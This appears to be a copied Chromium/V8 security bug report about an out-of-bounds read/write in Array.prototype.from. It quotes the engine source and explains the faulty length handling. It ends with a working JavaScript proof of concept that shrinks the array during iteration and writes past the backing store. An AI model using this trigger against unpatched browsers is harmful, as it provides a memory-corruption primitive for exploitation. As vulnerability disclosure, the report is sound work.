This is copied from the report in issue 820838:

OOB read/write using Array.prototype.from

<b>VULNERABILITY DETAILS</b>
v8/src/builtins/builtins-array-gen.cc:1945:
  void GenerateSetLength(TNode<Context> context, TNode<Object> array,
                         TNode<Number> length) {
    Label fast(this), runtime(this), done(this);
    // Only set the length in this stub if
    // 1) the array has fast elements,
    // 2) the length is writable,
    // 3) the new length is greater than or equal to the old length.

    // 1) Check that the array has fast elements.
    // TODO(delphick): Consider changing this since it does an an unnecessary
    // check for SMIs.
    // TODO(delphick): Also we could hoist this to after the array construction
    // and copy the args into array in the same way as the Array constructor.
    BranchIfFastJSArray(array, context, &fast, &runtime);

    BIND(&fast);
    {
      TNode<JSArray> fast_array = CAST(array);

      TNode<Smi> length_smi = CAST(length);
      TNode<Smi> old_length = LoadFastJSArrayLength(fast_array);
      CSA_ASSERT(this, TaggedIsPositiveSmi(old_length));

      // 2) Ensure that the length is writable.
      // TODO(delphick): This check may be redundant due to the
      // BranchIfFastJSArray above.
      EnsureArrayLengthWritable(LoadMap(fast_array), &runtime);

      // 3) If the created array already has a length greater than required,
      //    then use the runtime to set the property as that will insert holes
      //    into the excess elements and/or shrink the backing store.
      GotoIf(SmiLessThan(length_smi, old_length), &runtime);

      StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,
                                     length_smi);

      Goto(&done);
    }

    BIND(&runtime);
    {
      CallRuntime(Runtime::kSetProperty, context, static_cast<Node*>(array),
                  CodeStubAssembler::LengthStringConstant(), length,
                  SmiConstant(LanguageMode::kStrict));
      Goto(&done);
    }

    BIND(&done);
  }
};

// ES #sec-array.from
TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) {
[...]
    BIND(&loop);
    {
      // Loop while iterator is not done.
      TNode<Object> next = CAST(iterator_assembler.IteratorStep(
          context, iterator_record, &loop_done, fast_iterator_result_map));
      TVARIABLE(Object, value,
                CAST(iterator_assembler.IteratorValue(
                    context, next, fast_iterator_result_map)));

      // If a map_function is supplied then call it (using this_arg as
      // receiver), on the value returned from the iterator. Exceptions are
      // caught so the iterator can be closed.
      {
        Label next(this);
        GotoIf(IsUndefined(map_function), &next);

        CSA_ASSERT(this, IsCallable(map_function));
        Node* v = CallJS(CodeFactory::Call(isolate()), context, map_function,
                         this_arg, value.value(), index.value());
        GotoIfException(v, &on_exception, &var_exception);
        value = CAST(v);
        Goto(&next);
        BIND(&next);
      }

      // Store the result in the output object (catching any exceptions so the
      // iterator can be closed).
      Node* define_status =
          CallRuntime(Runtime::kCreateDataProperty, context, array.value(),
                      index.value(), value.value());
      GotoIfException(define_status, &on_exception, &var_exception);

      index = NumberInc(index.value());

      Goto(&loop);
    }

    BIND(&loop_done);
    {
      length = index;
      Goto(&finished);
    }
[...]
  BIND(&finished);

  // Finally set the length on the output and return it.
  GenerateSetLength(context, array.value(), length.value());
  args.PopAndReturn(array.value());
}


When the new length of a fast array is greater than the old length, GenerateSetLength() [1] should
also fall back to the runtime to resize the backing store. Otherwise, the array ends up in a state
where data past the end of the backing store can be accessed.

ArrayFrom() might pass an array whose length is less than expected to GenerateSetLength() if a
user-defined iterator shrinks the array right before returning the "end of iteration" marker.

<b>REPRODUCTION CASE</b>
<script>
let oobArray = [];
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
  {
    counter : 0,
    max : 1024 * 1024 * 8,
    next() {
      let result = this.counter++;
      if (this.counter == this.max) {
        oobArray.length = 0;
        return {done: true};
      } else {
        return {value: result, done: false};
      }
    }
  }
) });
oobArray[oobArray.length - 1] = 0x41414141;
</script>